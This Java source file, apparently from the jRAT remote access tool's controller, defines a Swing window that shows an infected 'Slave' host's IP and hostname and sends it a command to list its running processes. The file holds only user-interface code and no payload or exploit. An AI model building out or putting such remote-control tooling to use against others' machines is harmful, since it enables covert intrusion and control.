package io.jrat.controller.ui.frames;

import io.jrat.controller.Slave;
import io.jrat.controller.packets.outgoing.Packet19ListProcesses;
import io.jrat.controller.ui.panels.PanelControlRemoteProcess;

import java.awt.Toolkit;
import java.awt.event.WindowAdapter;
import java.awt.event.WindowEvent;
import java.util.HashMap;
import java.util.Map;

import javax.swing.JFrame;


@SuppressWarnings("serial")
public class FrameRemoteProcess extends BaseFrame {

	public static final Map<Slave, FrameRemoteProcess> INSTANCES = new HashMap<Slave, FrameRemoteProcess>();

	private PanelControlRemoteProcess panel;

	public FrameRemoteProcess(Slave sl) {
		super(sl);
		setTitle("Remote Process - " + sl.getIP() + " - " + sl.getHostname());
		setIconImage(Toolkit.getDefaultToolkit().getImage(FrameRemoteProcess.class.getResource("/icons/process.png")));
		setResizable(false);
		addWindowListener(new WindowAdapter() {
			@Override
			public void windowClosing(WindowEvent e) {
				exit();
			}
		});
		INSTANCES.put(sl, this);
		setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
		setBounds(100, 100, 535, 326);
		
		panel = new PanelControlRemoteProcess(sl);
		
		add(panel);
	}

	public void list() {
		slave.addToSendQueue(new Packet19ListProcesses());
	}
	
	public void exit() {
		INSTANCES.remove(slave);
	}
	
	public PanelControlRemoteProcess getPanel() {
		return panel;
	}
}
